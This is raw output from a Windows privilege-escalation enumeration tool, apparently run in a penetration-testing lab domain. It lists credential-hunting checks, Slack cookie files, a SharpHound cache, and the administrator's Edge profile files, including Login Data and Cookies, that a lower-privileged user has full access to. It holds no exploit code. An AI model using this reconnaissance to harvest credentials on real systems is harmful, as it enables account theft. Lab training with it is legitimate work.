???????????? Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

???????????? Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

???????????? Current IE tabs
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                                             
    Not Found

???????????? Looking for GET credentials in IE history
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                                                                             


???????????? IE history -- limit 50
                                                                                                        
    http://go.microsoft.com/fwlink/p/?LinkId=255141

???????????? IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


????????????????????????????????????? Interesting files and registry ?????????????????????????????????????                                                                                                      

???????????? Putty Sessions
    Not Found

???????????? Putty SSH Host keys
    Not Found

???????????? SSH keys in registry
? If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry          
    Not Found

???????????? SuperPutty configuration files

???????????? Enumerating Office 365 endpoints synced by OneDrive.
                                                                                                        
    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-1396373213-2872852198-2033860859-2102
      Name:  Personal
        UserFolder                                 C:\Users\tquinn\OneDrive
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


???????????? Cloud Credentials
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                               
    Not Found

???????????? Unattend Files

???????????? Looking for common SAM & SYSTEM backups

???????????? Looking for McAfee Sitelist.xml Files

???????????? Cached GPP Passwords

???????????? Looking for possible regs with creds
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry                                                                                          
    Not Found
    Not Found
    Not Found
    Not Found

???????????? Looking for possible password files in users homes
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                               
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

???????????? Searching for Oracle SQL Developer config files
                                                                                                        

???????????? Slack files & directories
  note: check manually if something is found
   Directory:       C:\Users\rweston_da\AppData\Roaming\Slack\
   Directory:       C:\Users\tquinn\AppData\Roaming\Slack\
   File:            C:\Users\tquinn\AppData\Roaming\Slack\Cookies
   File:            C:\Users\tquinn\AppData\Roaming\Slack\storage\slack-workspaces
   File:            C:\Users\tquinn\AppData\Roaming\Slack\storage\slack-downloads

???????????? Looking for LOL Binaries and Scripts (can be slow)
?  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

???????????? Enumerating Outlook download files
                                                                                                        

???????????? Enumerating machine and user certificate files
                                                                                                        

???????????? Searching known files that can contain creds in home
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                               

???????????? Looking for documents --limit 100--
    Not Found

???????????? Office Most Recent Files -- limit 50
                                                                                                        
  Last Access Date           User                                           Application           Document                                                                                                      

???????????? Recent files --limit 70--
    Not Found

???????????? Looking inside the Recycle Bin for creds files
?  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                                                                               
    Not Found

???????????? Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                        
     C:\Users\All Users\Synaptics
     C:\Users\All Users\Synaptics\Synaptics.exe
     C:\Users\All Users
     C:\Users\All Users\ntuser.pol
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\tquinn\AppData\Local\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{5A3DF0DE-E9DE-4D98-AD6E-7982F24BD9BC}\User\Documents & Settings\fdeploy.ini                                         
     C:\Users\tquinn\AppData\Local\GroupPolicy\DataStore\0\SysVol\rastalabs.local\Policies\{5A3DF0DE-E9DE-4D98-AD6E-7982F24BD9BC}\User\Documents & Settings\fdeploy1.ini                                        
     C:\Users\tquinn\AppData\Local\Packages\windows_ie_ac_001\AC\INetHistory
     C:\Users\tquinn\AppData\Local\Packages\windows_ie_ac_001\AC\INetCookies
     C:\Users\tquinn\AppData\Local\Packages\windows_ie_ac_001\AC\INetCache
     C:\Users\tquinn\._cache_SharpHound.exe
     C:\Users\Default

???????????? Searching interesting files in other users home directories (can be slow)
                                                                                                        
     Checking folder: c:\users\administrator
                                                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\AppData\Local\IconCache.db": tquinn [Allow: AllAccess]
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\powershell.exe.log": tquinn [Allow: AllAccess]                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\CLR_v4.0\UsageLogs": tquinn [Allow: AllAccess]                                                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\CLR_v4.0\UsageLogs\mmc.exe.log": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\BrowserMetrics": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\BrowserMetrics\BrowserMetrics-675927E2-24E8.pma": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Crashpad\throttle_store.dat": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Crashpad\settings.dat": tquinn [Allow: AllAccess]                                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Crashpad": tquinn [Allow: AllAccess]                                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Crashpad\metadata": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\WebAssistDatabase-journal": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\WebAssistDatabase": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Web Data-journal": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Web Data": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Visited Links": tquinn [Allow: AllAccess]                                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Top Sites-journal": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Top Sites": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Shortcuts-journal": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Shortcuts": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Secure Preferences": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\README": tquinn [Allow: AllAccess]                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\PreferredApps": tquinn [Allow: AllAccess]                                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Preferences": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network Action Predictor-journal": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network Action Predictor": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Login Data-journal": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Login Data": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\LOG.old": tquinn [Allow: AllAccess]                                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\LOG": tquinn [Allow: AllAccess]                                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\LOCK": tquinn [Allow: AllAccess]                                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\load_statistics.db-wal": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\load_statistics.db-shm": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\load_statistics.db": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps Icons-journal": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\HubApps Icons": tquinn [Allow: AllAccess]                                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\History-journal": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\History": tquinn [Allow: AllAccess]                                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\heavy_ad_intervention_opt_out.db-journal": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\heavy_ad_intervention_opt_out.db": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Favicons-journal": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Favicons": tquinn [Allow: AllAccess]                                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\ExtensionActivityEdge-journal": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\ExtensionActivityEdge": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\ExtensionActivityComp-journal": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\ExtensionActivityComp": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DIPS-journal": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DIPS": tquinn [Allow: AllAccess]                                                                                   
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default": tquinn [Allow: AllAccess]                                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\arbitration_service_config.json": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\WebStorage\QuotaManager-journal": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\WebStorage": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\WebStorage\QuotaManager": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sync Data\LevelDB\000003.log": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sync Data\LevelDB\CURRENT": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sync Data\LevelDB\LOCK": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sync Data\LevelDB\LOG": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sync Data\LevelDB\LOG.old": tquinn [Allow: AllAccess]                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sync Data\LevelDB": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sync Data\LevelDB\MANIFEST-000001": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Site Characteristics Database\MANIFEST-000001": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Site Characteristics Database\LOG.old": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Site Characteristics Database\LOG": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Site Characteristics Database\LOCK": tquinn [Allow: AllAccess]                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Site Characteristics Database\CURRENT": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Site Characteristics Database": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Site Characteristics Database\000003.log": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\metadata\000003.log": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\metadata\CURRENT": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\metadata\LOCK": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\metadata\LOG": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\metadata\LOG.old": tquinn [Allow: AllAccess]                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\metadata": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\metadata\MANIFEST-000001": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\000003.log": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\CURRENT": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\LOCK": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\LOG": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\LOG.old": tquinn [Allow: AllAccess]                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\shared_proto_db\MANIFEST-000001": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sessions\Tabs_13378369762246269": tquinn [Allow: AllAccess]                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sessions": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Sessions\Session_13378369538271754": tquinn [Allow: AllAccess]                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Session Storage\MANIFEST-000001": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Session Storage\LOG": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Session Storage\LOCK": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Session Storage\CURRENT": tquinn [Allow: AllAccess]                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Session Storage": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Session Storage\000003.log": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SegmentInfoDB\LOCK": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SegmentInfoDB\LOG": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SegmentInfoDB": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SegmentInfoDB\LOG.old": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalDB\LOCK": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalDB\LOG": tquinn [Allow: AllAccess]                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalDB": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalDB\LOG.old": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalStorageConfigDB\LOCK": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalStorageConfigDB\LOG": tquinn [Allow: AllAccess]                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalStorageConfigDB": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Segmentation Platform\SignalStorageConfigDB\LOG.old": tquinn [Allow: AllAccess]                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_model_metadata_store\LOG.old": tquinn [Allow: AllAccess]                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_model_metadata_store\LOG": tquinn [Allow: AllAccess]                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_model_metadata_store": tquinn [Allow: AllAccess]                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_model_metadata_store\LOCK": tquinn [Allow: AllAccess]                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_hint_cache_store\LOG.old": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_hint_cache_store\LOG": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_hint_cache_store": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\optimization_guide_hint_cache_store\LOCK": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Nurturing\campaign_history-journal": tquinn [Allow: AllAccess]                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Nurturing": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Nurturing\campaign_history": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Trust Tokens-journal": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Trust Tokens": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Token Bindings-journal": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Token Bindings": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Sdch Dictionaries": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\SCT Auditing Pending Reports": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Reporting and NEL-journal": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Reporting and NEL": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\NetworkDataMigrated": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Network Persistent State": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies-journal": tquinn [Allow: AllAccess]                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb\000003.log": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb\CURRENT": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb\LOCK": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb\LOG": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb\LOG.old": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb\MANIFEST-000001": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\GPUCache\index": tquinn [Allow: AllAccess]                                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\GPUCache\data_3": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\GPUCache\data_2": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\GPUCache\data_1": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\GPUCache": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\GPUCache\data_0": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Feature Engagement Tracker\AvailabilityDB\LOCK": tquinn [Allow: AllAccess]                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Feature Engagement Tracker\AvailabilityDB": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Feature Engagement Tracker\AvailabilityDB\LOG": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Feature Engagement Tracker\EventDB\LOCK": tquinn [Allow: AllAccess]                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Feature Engagement Tracker\EventDB": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Feature Engagement Tracker\EventDB\LOG": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension State\MANIFEST-000001": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension State\LOG.old": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension State\LOG": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension State\LOCK": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension State\CURRENT": tquinn [Allow: AllAccess]                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension State": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension State\000003.log": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Scripts\MANIFEST-000001": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Scripts\LOG": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Scripts\LOCK": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Scripts\CURRENT": tquinn [Allow: AllAccess]                                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Scripts": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Scripts\000003.log": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Rules\MANIFEST-000001": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Rules\LOG": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Rules\LOCK": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Rules\CURRENT": tquinn [Allow: AllAccess]                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Rules": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Extension Rules\000003.log": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction\EntityExtractionAssetStore.db\000003.log": tquinn [Allow: AllAccess]                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction\EntityExtractionAssetStore.db\CURRENT": tquinn [Allow: AllAccess]                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction\EntityExtractionAssetStore.db\LOCK": tquinn [Allow: AllAccess]                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction\EntityExtractionAssetStore.db\LOG": tquinn [Allow: AllAccess]                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction\EntityExtractionAssetStore.db\LOG.old": tquinn [Allow: AllAccess]                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction\EntityExtractionAssetStore.db": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EntityExtraction\EntityExtractionAssetStore.db\MANIFEST-000001": tquinn [Allow: AllAccess]                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithWinRt\LOG.old": tquinn [Allow: AllAccess]                                                       
